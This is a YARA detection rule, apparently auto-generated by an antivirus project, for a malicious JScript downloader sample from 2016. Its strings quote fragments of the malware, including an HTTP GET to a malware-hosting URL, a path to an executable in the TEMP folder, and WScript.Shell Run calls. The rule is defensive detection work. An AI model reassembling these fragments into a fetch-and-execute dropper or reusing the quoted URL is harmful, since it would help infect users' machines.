rule sig_20160329_97a781626ea0e0ca76296b1f9ae048ab {
  meta:
    description = "datamaliciousorder - file 20160329_97a781626ea0e0ca76296b1f9ae048ab.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce8c874265160dcb2024a0882284b4f6da0c8d3df746cd922aa534af1f444684"

  strings:
    $s1  = "p0[hr](\"GET\", \"http://pasticceriabonci.com/n4usj\", false);" fullword ascii
    $s2  = "function Ym() {return lU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vwkrezSwZQYV.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Jw](Vj() * 11); if (p0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var lU = function U0() {return WScript[bu](\"WScript.Shell\");}(), fR = 11;" fullword ascii
    $s5  = "function q(U1, b){it = it * 1; return U1 - b;};" fullword ascii
    $s6  = "function g(){return \"\" + s;};" fullword ascii
    $s7  = "function iy(C){lU[\"Run\"](C, it, it);};" fullword ascii
    $s8  = "function U() {return ((as == true) && (as == Sd)) ? 1 : it;};" fullword ascii
    $s9  = " while (g0){" fullword ascii
    $s10 = "function p(){return bu;};" fullword ascii
    $s11 = "return q(V, UP);" fullword ascii
    $s12 = "var wa = new this[\"Date\"]();" fullword ascii
    $s13 = "function Vj(){return 22;};" fullword ascii
    $s14 = "function Os()" fullword ascii
    $s15 = "function qD(H) {var K = (1, 2, 3, 4, 5, H); return K;};" fullword ascii
    $s16 = "var s0 = false;" fullword ascii
    $s17 = "as = true; " fullword ascii
    $s18 = "Sd = true; " fullword ascii
    $s19 = "var Sd = false;" fullword ascii
    $s20 = "var as = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}